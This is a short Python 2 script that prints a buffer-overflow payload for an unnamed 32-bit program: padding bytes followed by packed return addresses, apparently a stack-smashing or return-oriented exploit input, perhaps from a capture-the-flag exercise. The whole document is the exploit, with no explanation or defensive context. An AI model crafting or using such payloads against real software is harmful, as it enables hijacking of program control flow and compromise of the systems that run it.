import struct
print 'a'*44 + struct.pack('<I', 0x8049d03) + struct.pack('<I', 0x80b5871) + 'a'*24 + struct.pack('<I', 0x08049e97)
